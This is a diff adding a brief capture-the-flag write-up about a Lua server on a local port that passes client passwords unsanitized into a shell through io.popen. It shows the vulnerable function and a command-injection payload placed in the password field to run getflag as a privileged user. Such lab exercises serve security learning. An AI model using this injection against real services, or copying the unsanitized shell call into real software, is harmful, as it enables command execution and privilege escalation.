@@ -1,0 +1,25 @@
+
+- home is not empty containing a lua script, it is server code binding to 127.0.0.1:5151
+infinitly accepting client connection prompting `Password: ` and passes the pass writen by the
+client write to `function hash(pass)`
+
+function hash(pass)
+	prog = io.popen("echo "..pass.." | sha1sum", "r")
+	data = prog:read("*all")
+	prog:close()
+
+	data = string.sub(data, 1, 40)
+
+	return data
+end
+
+- since the calling process is flag11 owned, the command inside `io.popen` call is executed
+as flag11.
+
+- the program does not sanitize what we send so it seems we can inject code
+io.popen("echo "t;injected code exec as flag11;t" | sha1sum", "r")
+
+- we'll run getflag and redirect the standard output to /tmp/flag our payload will be
+t;getflag > /tmp/flag;t
+
+flag obtained
